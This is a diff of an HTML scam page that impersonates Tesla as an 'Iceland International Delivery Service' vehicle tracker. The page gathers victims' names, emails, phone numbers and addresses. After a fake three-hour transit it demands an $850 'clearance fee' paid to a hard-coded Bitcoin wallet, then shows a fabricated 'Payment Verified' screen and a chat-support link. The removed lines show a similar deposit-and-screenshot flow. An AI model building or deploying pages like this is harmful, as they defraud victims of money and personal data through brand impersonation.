-            img.style.maxWidth = '240px';
-            img.style.borderRadius = '8px';
-            preview.appendChild(img);
-        };
-        reader.readAsDataURL(file);
-    });
-
-    function confirmDeposit() {
-        const input = document.getElementById('payment-screenshot');
-        if (!input || !input.files || input.files.length === 0) {
-            if (!confirm('No screenshot uploaded. Are you sure you want to continue?')) return;
-        }
-
-        document.getElementById('step-deposit').classList.add('hidden');
-        document.getElementById('step-final').classList.remove('hidden');
-
-        setTimeout(() => {
-            window.location.href = 'https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings';
-        }, 10000);
-    }
-
-    function openPlansSection() { document.getElementById('plans-section').scrollIntoView({ behavior: 'smooth' }); }
-
-    (function init() {
-        if (!document.getElementById('user-avatar-large')) {
-            const large = document.createElement('div');
-            large.id = 'user-avatar-large';
-            large.className = 'w-40 h-40 rounded-full border-4 border-red-50 bg-red-50 overflow-hidden shadow hidden';
-            document.body.appendChild(large);
-        }
-    })();
-</script>
-
+<body>
+  <div class="container">
+    <header>
+      <h1>⚡ Tesla Model Delivery Tracker</h1>
+      <p>Iceland International Delivery Service</p>
+    </header>
+
+    <!-- Loading Screen -->
+    <div id="loading">
+      <div class="spinner"></div>
+      <p style="color: #667eea; font-size: 1.2em; font-weight: 600;">Initializing delivery system...</p>
+    </div>
+
+    <!-- Registration Form -->
+    <div id="registration">
+      <h2>📋 Registration - Complete Your Delivery Profile</h2>
+      <form id="registrationForm" onsubmit="submitRegistration(event)">
+        <div class="form-row">
+          <div class="form-group">
+            <label for="fullName">Full Name *</label>
+            <input 
+              type="text" 
+              id="fullName" 
+              name="fullName" 
+              placeholder="Enter your full name"
+              required
+            />
+            <span class="error-text">Please enter a valid name (at least 3 characters)</span>
+          </div>
+          <div class="form-group">
+            <label for="email">Email Address *</label>
+            <input 
+              type="email" 
+              id="email" 
+              name="email" 
+              placeholder="your.email@example.com"
+              required
+            />
+            <span class="error-text">Please enter a valid email address</span>
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="phone">Contact Number *</label>
+            <input 
+              type="tel" 
+              id="phone" 
+              name="phone" 
+              placeholder="+354 XXX XXXX"
+              required
+            />
+            <span class="error-text">Please enter a valid contact number</span>
+          </div>
+          <div class="form-group">
+            <label for="trackingNumber">Tracking Number *</label>
+            <input 
+              type="text" 
+              id="trackingNumber" 
+              name="trackingNumber" 
+              placeholder="Enter your tracking number"
+              required
+            />
+            <span class="error-text">Tracking number is required</span>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="address">Delivery Address in Iceland *</label>
+          <textarea 
+            id="address" 
+            name="address" 
+            placeholder="Street address, postal code, city, Iceland"
+            required
+          ></textarea>
+          <span class="error-text">Please enter a valid address</span>
+        </div>
+
+        <button type="submit">Continue to Delivery Tracking</button>
+      </form>
+    </div>
+
+    <!-- Delivery Menu -->
+    <div id="delivery">
+      <h2>Welcome to Your Tesla Delivery</h2>
+      <p>Track your Tesla Model delivery from Tesla Factory to Iceland</p>
+      <button onclick="startTracking()">Start Tracking</button>
+    </div>
+
+    <!-- Error Message -->
+    <div id="errorMsg">
+      <p id="errorText"></p>
+      <button onclick="resetTracking()" style="margin-top: 20px;">Try Again</button>
+    </div>
+
+    <!-- Map Section -->
+    <div id="mapSection">
+      <h3>🌍 Tesla Delivery Route - Factory to Iceland</h3>
+      <iframe id="mapFrame" src="https://maps.app.goo.gl/a2dnvXy3NrM5UQUc9" allowfullscreen="" loading="lazy"></iframe>
+      <div class="status-box">
+        <p id="carStatus">🚗 Tesla Model is in transit from Tesla Factory...</p>
+        <p style="font-size: 0.95em; color: #666;">Estimated delivery: 72-96 hours</p>
+      </div>
+    </div>
+
+    <!-- Payment Prompt -->
+    <div id="paymentPrompt">
+      <h3>💳 Clearance Fee Required</h3>
+      
+      <div class="payment-info">
+        <p>A clearance and handling fee of <strong>$850 USD</strong> is required to complete the delivery to Iceland.</p>
+        <p style="margin-top: 20px; font-size: 1.05em;">
+          <strong>Recipient:</strong> Tesla International Logistics
+        </p>
+        <p style="margin: 15px 0;">
+          <strong>Payment Method:</strong> Bitcoin
+        </p>
+        <div class="wallet-address">
+          bc1q5mtqsh96qmnesfrn0dtc9je2e2ts904pnpswvc
+        </div>
+        <p style="color: #999; font-size: 0.9em;">
+          Please copy the address above or use the QR code provided
+        </p>
+      </div>
+
+      <div class="tracking-info">
+        <p><strong>Delivery Address:</strong> <span id="userAddress"></span></p>
+        <p><strong>Recipient Name:</strong> <span id="userName"></span></p>
+        <p><strong>Contact:</strong> <span id="userPhone"></span></p>
+      </div>
+
+      <div class="highlight">
+        <p><strong>⚠️ Important Information:</strong></p>
+        <p>Once payment is confirmed and verified, your Tesla Model will complete customs clearance and proceed to your Iceland delivery address immediately.</p>
+        <p class="blinking">📍 Status: Awaiting Clearance Payment</p>
+      </div>
+
+      <div style="margin-top: 25px;">
+        <p style="color: #666; margin-bottom: 15px;">Upload your payment confirmation screenshot below:</p>
+        <input type="file" accept="image/*" onchange="confirmDelivery()" />
+        <p style="color: #999; font-size: 0.85em; margin-top: 10px;">Supported formats: JPG, PNG, GIF</p>
+      </div>
+    </div>
+
+    <!-- Confirmation -->
+    <div id="confirmation">
+      <div class="success-box">
+        <h2 style="margin: 0; color: #27ae60;">✅ Payment Verified</h2>
+        <p style="margin-top: 10px;">Thank you for completing the clearance payment.</p>
+      </div>
+
+      <p style="font-size: 1.15em; margin-top: 25px;">Your <strong>2022 Tesla Model</strong> is now in final delivery stage.</p>
+      <p style="color: #666;">🚚 Delivery in progress to your Iceland address</p>
+
+      <div class="status-box">
+        <p><strong>Recipient:</strong> <span id="confirmName"></span></p>
+        <p><strong>Delivery Address:</strong> <span id="confirmAddress"></span></p>
+        <p><strong>Expected Delivery:</strong> 48-72 hours</p>
+      </div>
+
+      <p style="color: #999; font-size: 0.95em; margin-top: 20px;">We will send you real-time updates via email and SMS</p>
+      <img id="uploadedImage" src="" alt="Payment Confirmation" />
+
+      <div class="support-link">
+        <p style="color: #333; margin-bottom: 15px;">Need assistance? Contact our support team:</p>
+        <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank">
+          💬 Live Chat Support
+        </a>
+        <p class="footer-text">Available 24/7 for your delivery inquiries</p>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    let userDataCache = {};
+    let attempts = 0;
+    const maxAttempts = 5;
+    const validTrackingNumber = "TM2022ICELAND";
+
+    window.onload = () => {
+      document.getElementById("loading").style.display = "flex";
+      setTimeout(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("registration").style.display = "block";
+      }, 2000);
+    };
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    function validatePhone(phone) {
+      const re = /^[\d\s+\-()]{7,}$/;
+      return re.test(phone);
+    }
+
+    function submitRegistration(event) {
+      event.preventDefault();
+
+      let isValid = true;
+      const fullName = document.getElementById("fullName").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const address = document.getElementById("address").value.trim();
+      const trackingNumber = document.getElementById("trackingNumber").value.trim();
+
+      // Clear previous errors
+      document.querySelectorAll(".error-text").forEach(el => el.style.display = "none");
+      document.querySelectorAll("input, textarea").forEach(el => el.classList.remove("error"));
+
+      // Validate Full Name
+      if (fullName.length < 3) {
+        isValid = false;
+        document.getElementById("fullName").classList.add("error");
+        document.getElementById("fullName").nextElementSibling.style.display = "block";
+      }
+
+      // Validate Email
+      if (!validateEmail(email)) {
+        isValid = false;
+        document.getElementById("email").classList.add("error");
+        document.getElementById("email").nextElementSibling.style.display = "block";
+      }
+
+      // Validate Phone
+      if (!validatePhone(phone)) {
+        isValid = false;
+        document.getElementById("phone").classList.add("error");
+        document.getElementById("phone").nextElementSibling.style.display = "block";
+      }
+
+      // Validate Address
+      if (address.length < 10) {
+        isValid = false;
+        document.getElementById("address").classList.add("error");
+        document.getElementById("address").nextElementSibling.style.display = "block";
+      }
+
+      // Validate Tracking Number
+      if (trackingNumber.length === 0) {
+        isValid = false;
+        document.getElementById("trackingNumber").classList.add("error");
+        document.getElementById("trackingNumber").nextElementSibling.style.display = "block";
+      }
+
+      if (isValid) {
+        userDataCache = {
+          fullName,
+          email,
+          phone,
+          address,
+          trackingNumber
+        };
+        
+        document.getElementById("registration").style.display = "none";
+        document.getElementById("delivery").style.display = "block";
+      }
+    }
+
+    function startTracking() {
+      if (userDataCache.trackingNumber === validTrackingNumber) {
+        document.getElementById("delivery").style.display = "none";
+        document.getElementById("mapSection").style.display = "block";
+
+        // Simulate 3-hour journey
+        setTimeout(() => {
+          document.getElementById("carStatus").innerText = "🚗 Tesla approaching Iceland destination...";
+          document.getElementById("mapSection").style.display = "none";
+          document.getElementById("paymentPrompt").style.display = "block";
+          
+          // Populate user data in payment section
+          document.getElementById("userAddress").innerText = userDataCache.address;
+          document.getElementById("userName").innerText = userDataCache.fullName;
+          document.getElementById("userPhone").innerText = userDataCache.phone;
+        }, 10800000); // 3 hours in milliseconds
+
+        // For testing: Show payment prompt immediately (uncomment below to test)
+        // document.getElementById("mapSection").style.display = "none";
+        // document.getElementById("paymentPrompt").style.display = "block";
+        // document.getElementById("userAddress").innerText = userDataCache.address;
+        // document.getElementById("userName").innerText = userDataCache.fullName;
+        // document.getElementById("userPhone").innerText = userDataCache.phone;
+      } else {
+        attempts++;
+        document.getElementById("delivery").style.display = "none";
+        document.getElementById("errorMsg").style.display = "block";
+
+        if (attempts < maxAttempts) {
+          document.getElementById("errorText").innerText =
+            `❌ Invalid tracking number. You have ${maxAttempts - attempts} attempt(s) remaining.`;
+        } else {
+          document.getElementById("errorText").innerText =
+            `🚫 Too many failed attempts. Please try again later or contact support.`;
+        }
+      }
+    }
+
+    function resetTracking() {
+      if (attempts < maxAttempts) {
+        attempts = 0;
+        document.getElementById("errorMsg").style.display = "none";
+        document.getElementById("delivery").style.display = "block";
+        document.getElementById("trackingNumber").value = "";
+      } else {
+        document.getElementById("errorText").innerText =
+          `🚫 Locked for security. Please contact support: https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b`;
+      }
+    }
+
+    function confirmDelivery() {
+      const fileInput = event.target;
+      if (fileInput.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          document.getElementById("uploadedImage").src = e.target.result;
+          document.getElementById("paymentPrompt").style.display = "none";
+          document.getElementById("confirmation").style.display = "block";
+          
+          // Populate confirmation details
+          document.getElementById("confirmName").innerText = userDataCache.fullName;
+          document.getElementById("confirmAddress").innerText = userDataCache.address;
+        };
+        reader.readAsDataURL(fileInput.files[0]);
+      }
+    }
+  </script>
 </body>
 </html>
